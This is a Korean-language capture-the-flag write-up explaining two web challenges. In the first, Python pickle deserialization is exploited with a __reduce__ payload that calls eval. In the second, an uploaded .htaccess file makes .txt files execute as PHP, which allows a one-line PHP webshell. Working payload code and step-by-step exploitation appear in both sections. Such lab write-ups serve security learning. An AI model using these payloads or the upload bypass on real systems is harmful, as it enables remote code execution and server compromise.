## 목차
- [목차](#목차)
- [web-deserialize-python](#web-deserialize-python)
  - [deserialize (역직렬화 취약점)](#deserialize-역직렬화-취약점)
  - [문제의 풀이](#문제의-풀이)
  - [Payload 구성](#payload-구성)
- [Apache htaccess](#apache-htaccess)
  - [htaccess 취약점](#htaccess-취약점)
  - [Payload 구성](#payload-구성-1)
  - [문제의 풀이](#문제의-풀이-1)

## web-deserialize-python

### deserialize (역직렬화 취약점)
* deserialize (역직렬화): serialize(직렬화)된 데이터를 원래의 객체로 복구하는 과정
* Python의 대표적인 직렬화 모듈로 pickle이 있다.
* 해당 모듈에는 `__reduce__` 메소드에서 발생하는 취약점이 존재한다.
  * pickle 모듈은 객체의 `__reduce__` 메소드 오버라이딩을 통한 객체의 재생성을 지원한다.
  * 해당 메서드는 함수(생성자, 함자 포함)와 그 함수의 인자 튜플 총 2개의 값을 튜플로 리턴한다.
  * 이 때, 실행할 함수에 `eval`, `os.system` 등을 넣으면 RCE 등 보안 취약점이 발생할 수 있다.

### 문제의 풀이
* 문제의 페이지는 아래의 방식으로 세션을 생성해준다.
  1. name, userid, password로 구성된 dictionary를 만든다.
  2. 해당 dictionary를 pickle로 dump한다.
  3. 해당 bytes를 base64로 인코딩하여 세션을 생성한다.
* 결국, name, userid, password 셋 중 하나만 골라 플래그로 지정해주면 된다.

### Payload 구성
* 서버에서 pickle bytes를 load할 때 flag를 로드할 수 있도록, 아래와 같이 class를 구성한다.
    ```py
    class Flag:
        def __reduce__(self):
            return (eval, ("open('./flag.txt').read()",))
    ```
* 해당 오브젝트는 Flag로 변환될 것이기에, 적당히 `name` key의 value로 넣어준다.
    ```py
    obj = { 'name': Flag() }
    ```
* 마지막으로, 서버의 세션 생성 과정과 동일한 과정으로 해당 오브젝트를 세션처럼 만들어준다.
    ```py
    import base64, pickle
    raw = pickle.dumps(obj)
    payload = base64.b64encode(raw).decode('utf-8')
    print(payload)
    ```
* 출력된 페이로드를 문제 페이지의 Check Payload 탭에 입력하면, Name에서 Flag를 획득할 수 있다.

## Apache htaccess

### htaccess 취약점
* Apache 기반 서버는 `000-default.conf`를 서버의 기본 설정으로 사용한다.
* 해당 설정 파일에는 `AllowOverride`라는 필드가 있다.
  * 해당 필드는 `.htaccess` 파일을 이용한 디렉토리별 설정 덮어쓰기를 허용할지를 나타낸다.
  * 문제의 서버에는 해당 옵션이 `ALL`로 설정되어있기에, `.htaccess` 파일을 업로드해 업로드 폴더의 설정을 원격으로 변경할 수 있다.
* `.htaccess` 파일에서는 다양한 설정을 조작할 수 있다.
  * 그 중, 이 문제에서 필요한 옵션은 `AddType` 옵션이다.
  * `AddType` 옵션은 2번째 옵션으로 지정한 확장자를 1번째 옵션으로 설정한 MIME type으로 취급하도록 하는 옵션이다.

### Payload 구성
* `.htaccess`
  ```apache
  AddType application/x-httpd-php .txt
  ```
  * txt파일을 php 스크립트 형식의 MIME type으로 취급한다.
  * 해당 옵션을 통해, upload.php 파일의 php 확장자 검사를 피해 php파일을 업로드할 수 있다.
* `ws.txt`
  ```php
  <?php system($_GET[cmd]); ?>
  ```
  * 위에서 업로드한 `.htaccess` 파일로 .txt 파일이 php파일 취급된다.
  * 따라서 php파일 형태의 Webshell을 확장자만 txt로 바꾸어 올려주면 일반적인 webshell처럼 사용할 수 있다.

### 문제의 풀이
1. `.htaccess` 파일을 업로드한다.
   * 모든 업로드되는 파일은 `/var/www/html/upload`에 업로드되므로, `.htaccess` 또한 해당 경로에 저장된다.
   * 따라서, 해당 경로에 저장되는 모든 .txt 파일은 php파일처럼 작동한다.
2. `ws.txt` 파일을 업로드한다.
   * 해당 파일은 `.htaccess` 파일에 의해 웹쉘처럼 작동한다.
3. `/upload/ws.txt?cmd=/flag` 에 접근하면 플래그를 획득할 수 있다.
   * Dockerfile의 20~23번 줄에서 `flag.c` 파일을 `/flag`로 컴파일하는 것을 확인할 수 있다.
   * 때문에, 서버의 쉘에서 `/flag`를 실행하면 플래그를 획득할 수 있다.
   * 해당 작업을 Webshell을 통해 실행하여 플래그를 획득한다.
